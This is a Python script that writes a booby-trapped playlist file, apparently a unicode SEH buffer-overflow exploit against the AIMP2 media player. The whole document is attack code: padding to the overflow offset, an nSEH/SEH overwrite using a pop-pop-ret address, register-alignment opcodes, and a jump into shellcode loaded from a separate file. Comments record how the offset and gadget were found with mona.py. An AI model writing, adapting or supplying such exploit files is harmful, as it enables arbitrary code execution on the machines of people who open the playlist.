header = "[playlist]\n" + "NumberOfEntries=1\n" + "File1=";
#Pattern e3Fe (0x65334665 reversed) found in cyclic pattern at position 4030

#with open("pattern.txt", 'r') as f:
#    junk = f.read(5000)

with open("ok", 'r') as f:
    sc = f.read()

# padding required to correct sc align because of inaccurate jump
junk2 = ((0x84 / 2) - 4) * "X"
    
junk = junk2+sc
junk = junk + "A" * (4030-len(sc)-len(junk2))
nseh = "\x41\x6d" # inc ecx + nop/align
# run the app and load playlist beforehand to load all modules
# !py mona.py findwild -s pop r32#pop r32#ret -cp unicode
# 0x0045000e
# it should also encode harmless instrs so that we can reach the buffer on our way to align
seh = "\x0e\x45"

align = "\x58\x6d"*4 # pop eax + nop/align
#sub 0x1f00 to eax
align = align + "\x05\x01\x11" + "\x6d"
align = align + "\x2d\x20\x11" + "\x6d"

jmp = "\x50" + "\x6d" + "\xc3" # push eax + nop/align + ret

pad = 105 * "C"
sc = "\x90"*4
rest="B"*500
payload = header + junk + nseh + seh + align + jmp + pad + sc + rest

with open('aimp2sploit.pls', 'w') as f:
    f.write(payload)
